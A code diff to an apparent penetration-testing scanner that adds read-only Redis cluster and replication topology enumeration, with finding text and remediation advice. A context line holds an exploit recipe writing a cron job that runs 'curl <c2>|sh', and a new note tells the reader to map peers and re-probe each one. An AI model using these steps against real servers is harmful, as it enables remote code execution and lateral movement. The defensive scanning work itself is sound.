@@ -206,6 +206,92 @@ def _cve_2022_0543_safe_proof(sock: socket.socket, timeout: float) -> str:
     return reply if reply.startswith("lib=") else ""
 
 
+def _replication_slaves(info: dict) -> list[dict]:
+    """Extract `slave0:ip=...,port=...,state=...` entries from an INFO-parsed dict.
+    Returns [{host, port, state, offset, lag}] - empty when the peer is a replica
+    or standalone. Purely a metadata read; no data is retrieved from any peer."""
+    out: list[dict] = []
+    for k in sorted(info.keys()):
+        # Redis uses slave0/slave1/... (older) and, in some configs, replica0/... .
+        if not (k.startswith("slave") or k.startswith("replica")):
+            continue
+        head = k.rstrip("0123456789")
+        if head not in ("slave", "replica") or k == head:
+            continue
+        entry: dict = {}
+        for pair in (info[k] or "").split(","):
+            if "=" not in pair:
+                continue
+            kk, _, vv = pair.partition("=")
+            entry[kk.strip()] = vv.strip()
+        host = entry.get("ip", "")
+        if not host:
+            continue
+        out.append({"host": host, "port": entry.get("port", ""),
+                    "state": entry.get("state", ""),
+                    "offset": entry.get("offset", ""),
+                    "lag": entry.get("lag", "")})
+    return out
+
+
+def _parse_cluster_nodes(text: str) -> list[dict]:
+    """Parse the bulk reply of `CLUSTER NODES` per the Redis Cluster spec. Each line:
+
+        <id> <ip:port@cport[,hostname]> <flags> <master> <ping> <pong>
+        <config-epoch> <link-state> [<slot>...]
+
+    Returns [{id, host, port, cport, flags, master, role}]. Malformed / short lines
+    are skipped so a truncated reply degrades to what actually parsed."""
+    out: list[dict] = []
+    for raw in (text or "").splitlines():
+        line = raw.strip()
+        if not line:
+            continue
+        parts = line.split()
+        if len(parts) < 8:
+            continue
+        node_id = parts[0]
+        endpoint = parts[1]
+        flag_list = [f for f in parts[2].split(",") if f]
+        master = parts[3] if parts[3] != "-" else ""
+        addr = endpoint.split(",", 1)[0]           # strip optional hostname suffix
+        addr, _, cport = addr.partition("@")
+        # ip:port - IPv6 endpoints keep colons, so split at the LAST colon only.
+        if ":" in addr:
+            host, _, port = addr.rpartition(":")
+        else:
+            host, port = addr, ""
+        if "master" in flag_list:
+            role = "master"
+        elif "slave" in flag_list or "replica" in flag_list:
+            role = "slave"
+        else:
+            role = ""
+        out.append({"id": node_id, "host": host, "port": port, "cport": cport,
+                    "flags": flag_list, "master": master, "role": role})
+    return out
+
+
+def _cluster_topology(sock: socket.socket, timeout: float) -> tuple:
+    """Send `INFO replication` + `CLUSTER NODES` (read-only metadata) and return
+    (replication_slaves, cluster_nodes). Either list is empty when the peer does
+    not answer or answers with an error - never raises."""
+    slaves: list[dict] = []
+    nodes: list[dict] = []
+    try:
+        _command(sock, "INFO", "replication")
+        rep = _read_reply(sock, timeout)
+        if isinstance(rep, str):
+            slaves = _replication_slaves(_info_dict(rep))
+        _command(sock, "CLUSTER", "NODES")
+        cn = _read_reply(sock, timeout)
+        if isinstance(cn, str):
+            nodes = _parse_cluster_nodes(cn)
+    except OSError:
+        pass
+    return slaves, nodes
+
+
 def _deep(sock, out: dict, info: dict, timeout: float) -> None:
     """Read-only deep enumeration on an unauthenticated Redis: which RCE primitives are
     actually reachable (MODULE LOAD, replication, write-to-disk), the ACL identity, and
@@ -292,6 +378,17 @@ def _deep(sock, out: dict, info: dict, timeout: float) -> None:
         # file-write actually flushes to disk.
         out["persistence"] = bool((out.get("save") or "").strip()) or \
             (out.get("appendonly", "").lower() == "yes")
+        # Deployment-topology metadata: INFO replication yields the master's slave
+        # endpoints (or the master_host if we are the slave); CLUSTER NODES yields
+        # the cluster's full node list with IDs and roles. Both are pure reads -
+        # recce never writes a key or issues CLUSTER MEET / FAILOVER. On standalone
+        # or hardened peers where CLUSTER is disabled the calls simply return an
+        # error and the keys stay unset.
+        slaves, nodes = _cluster_topology(sock, timeout)
+        if slaves:
+            out["replication_slaves"] = slaves
+        if nodes:
+            out["cluster_nodes"] = nodes
     except OSError:
         pass
 
@@ -300,8 +397,8 @@ def probe(ip: str, port: int, timeout: float = _TIMEOUT) -> dict:
     """Connect and (read-only) fingerprint a Redis endpoint. Returns
     {reachable, unauth, version, os, role, keys, dir, dbfilename, protected_mode,
      requirepass, ssl, modules, module_load, replication, acl_user, acl_users,
-     cve_2022_0543, cve_2022_0543_evidence, persistence, error} - empty dict if
-     not Redis / unreachable."""
+     cve_2022_0543, cve_2022_0543_evidence, persistence, replication_slaves,
+     cluster_nodes, error} - empty dict if not Redis / unreachable."""
     out: dict = {"reachable": False, "unauth": False}
     try:
         sock = socket.create_connection((ip, port), timeout=timeout)
@@ -399,6 +496,14 @@ _NARRATIVE = {
         "CVE-2022-0543; it is actively exploited by the Muhstik and Redigo botnets. "
         "Upgrade the distro's redis-server package (the fix is in the packaging, not "
         "upstream Redis) and enforce AUTH."),
+    "redis_cluster_topology": (
+        "recce read the Redis deployment topology - the cluster's node IDs and roles "
+        "and/or the master's replica endpoints - without a credential. That map "
+        "hands an attacker every peer that shares this exposure (each is likely the "
+        "same unauth build with the same primitives) and discloses internal IPs "
+        "that may not otherwise be reachable from the attacker's vantage. Enforce "
+        "authentication so CLUSTER and INFO are not readable to untrusted clients "
+        "and bind the listener to a trusted interface."),
     "redis_acl_users": (
         "Redis ACL enumeration returned every configured username together with the "
         "SHA-256 password hash Redis stores for each user. The hashes are directly "
@@ -495,6 +600,47 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                         "dbfilename root; SET x '\\n\\n* * * * * curl <c2>|sh\\n\\n'; "
                         "SAVE."),
                     depth_tier="t2"))
+            nodes = pr.get("cluster_nodes") or []
+            slaves = pr.get("replication_slaves") or []
+            if pr.get("unauth") and (nodes or slaves):
+                bits: list[str] = []
+                if nodes:
+                    n_master = sum(1 for n in nodes if n.get("role") == "master")
+                    n_replica = sum(1 for n in nodes if n.get("role") == "slave")
+                    sample = "; ".join(
+                        f"{n.get('host', '?')}:{n.get('port', '?')} "
+                        f"[{(n.get('id') or '')[:8]}] {n.get('role') or 'unknown'}"
+                        for n in nodes[:8])
+                    bits.append(
+                        f"CLUSTER NODES lists {len(nodes)} node(s) "
+                        f"({n_master} master, {n_replica} replica): {sample}")
+                if slaves:
+                    slist = "; ".join(
+                        f"{s.get('host', '?')}:{s.get('port', '?')}"
+                        f"({s.get('state', '?')})"
+                        for s in slaves[:6])
+                    bits.append(
+                        f"INFO replication reports {len(slaves)} slave "
+                        f"endpoint(s): {slist}")
+                detail = ("recce read the Redis deployment topology (metadata "
+                          "only, no keys or values retrieved): " + " ".join(bits)
+                          + ".")
+                out.append(_finding(
+                    "medium",
+                    "Redis cluster / replication topology disclosed",
+                    tgt, detail,
+                    "redis-cli",
+                    f"redis-cli -h {h.ip} -p {p.portid} CLUSTER NODES ; "
+                    f"redis-cli -h {h.ip} -p {p.portid} INFO replication",
+                    "Enforce authentication so CLUSTER and INFO are not reachable "
+                    "unauthenticated, rename/disable CLUSTER for untrusted clients, "
+                    "and bind the listener to a trusted interface.",
+                    ["CWE-200"], kind="redis_cluster_topology",
+                    exploit_note=(
+                        "redis-cli -h <ip> -p <port> CLUSTER NODES  # map every "
+                        "peer's IP and role, then re-run the redis probe against "
+                        "each - peers usually share the same unauth exposure."),
+                    depth_tier="t1"))
             if pr.get("cve_2022_0543") is True:
                 # T2 SAFE proof: if the loadlib-actually-loads probe returned real
                 # server-side evidence (USER + date + which lua .so path worked), the
